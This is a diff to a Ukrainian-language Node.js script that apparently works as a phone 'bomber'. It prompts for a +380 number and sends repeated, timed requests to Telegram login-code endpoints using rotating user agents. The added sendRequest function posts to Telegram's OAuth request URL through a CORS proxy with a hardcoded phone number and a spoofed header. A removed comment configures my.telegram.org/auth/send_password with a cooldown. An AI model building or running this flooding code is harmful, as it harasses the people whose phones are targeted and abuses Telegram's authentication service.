@@ -5,7 +5,6 @@ import Axios from 'axios'
 import UserAgent from 'user-agents'
 import Chalk from 'chalk'
 
-import Process from 'node:child_process'
 import ReadLine from 'node:readline'
 import FS from 'node:fs'
 
@@ -17,7 +16,7 @@ const headers = {
 };
 
 (async () => {
-    Process.exec('clear')
+    console.clear()
 
     // Не змінювати назву змінної.
     const number = await ask(Chalk.magentaBright('Введіть номер телефону: ') + '+380')
@@ -61,6 +60,10 @@ const headers = {
         }, i * (delay_between * 1000))
     }
 })()
+
+async function sendRequest() {
+    return Axios.post("https://cors-anywhere.herokuapp.com/https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin%3Fsetln%3Dru", new URLSearchParams({ phone: '380634350140' }).toString(), { headers: { ...headers, "Content-type": "application/x-www-form-urlencoded", "x-requested-with": "https://localhost" }, withCredentials: true })
+}
 
 async function sendRepeatableRequest (runnable, cooldown) {
     await runnable()
@@ -113,17 +116,3 @@ function wrapText (quad_color, text) {
 function convertFunctionToString (function_) {
     return '(' + function_.toString() + ')()'
 }
-
-/*
-  "telegram.org": {
-    "cooldown": 180000,
-
-    "function": {
-      "code": "(async function sendRequest() { return await Axios.post('https://my.telegram.org/auth/send_password', new URLSearchParams({ phone: '+380' + '%phone-number%' }), { headers }) })()"
-    },
-
-    "expected_response": {
-      "body": "?"
-    }
-  },
- */
